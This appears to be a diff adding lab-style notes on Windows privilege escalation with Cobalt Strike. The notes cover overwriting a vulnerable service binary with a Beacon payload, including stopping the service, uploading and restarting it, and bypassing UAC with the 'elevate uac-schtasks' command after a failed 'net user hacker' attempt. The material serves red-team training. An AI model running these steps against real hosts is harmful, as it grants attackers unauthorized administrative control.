@@ -467,3 +467,98 @@ beacon> download Service 3.exe
 [*] download of Service 3.exe is complete
 ```
 
+{% hint style="info" %}
+Be sure to make a copy of your payload while renaming it to `Service 3.exe`.
+
+```
+PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
+```
+{% endhint %}
+
+**Then, attempt to upload it:**
+
+```
+beacon> upload C:\Payloads\Service 3.exe
+[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
+```
+
+{% hint style="info" %}
+You will likely get the following error:
+
+```
+C:\>net helpmsg 32
+The process cannot access the file because it is being used by another process.
+```
+
+This means that the file is already in use, which makes sense since the service is already running.
+{% endhint %}
+
+```
+beacon> run sc stop VulnService3
+beacon> upload C:\Payloads\Service 3.exe
+beacon> ls
+[*] Listing: C:\Program Files\Vuln Services\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 5kb      fil     02/23/2021 15:04:13   Service 1.exe
+ 5kb      fil     02/23/2021 15:04:13   Service 2.exe
+ 290kb    fil     03/03/2021 11:38:24   Service 3.exe
+
+beacon> run sc start VulnService3
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.123.102
+```
+
+## User Account Control (UAC) Bypasses
+
+### What is UAC?
+
+UAC is a technology that exists in Windows which forces applications to prompt for consent when requesting an Administrative Access Token.
+
+### For Example...
+
+_Bob_ is a local administrator on _**Workstation 2**_, but if we open a Command Prompt and attempt to add a new local user, we will get an access denied.
+
+This instance of `cmd.exe` is running in _**Medium Integrity**_ mode.
+
+**Below, we attempt to add a new user, `hacker`, via `net user`:**
+
+```
+C:\Users\bfarmer>net user hacker Passw0rd! /add
+System error 5 has occurred.
+
+Access is denied.
+
+C:\Users\bfarmer>whoami /groups
+
+Mandatory Label\Medium Mandatory Level
+```
+
+Instead, we will need to right-click or `CTRL` + `SHIFT` + `ENTER` to _**Run as Administrator**_ and cause a UAC prompt to appear.
+
+<figure><img src="../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>
+
+After clicking _**yes**_, the Command Prompt will open will sufficient privileges, appropriate for making system configuration changes, as it will now be running in _**High Integrity**_.
+
+```
+C:\Windows\system32>whoami /groups
+
+Mandatory Label\High Mandatory Level
+```
+
+A "UAC Bypass" is a technique that allows for a _**Medium Integrity**_ process to elevate itself or spawn a new process in _**High Integrity**_, without prompting the user for consent.
+
+Being in _**High Integrity**_ context is important for attackers because it's required for various post-exploitation actions such as dumping credentials.
+
+**Beacon** has a few built-in UAC bypasses and a few more which are covered via the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) (pre-loaded in Cobalt Strike).&#x20;
+
+These are exposed via the `elevate` command.
+
+```
+beacon> elevate uac-schtasks tcp-local
+[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
+[+] established link to child beacon: 10.10.123.102
+```
+
+<figure><img src="../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>
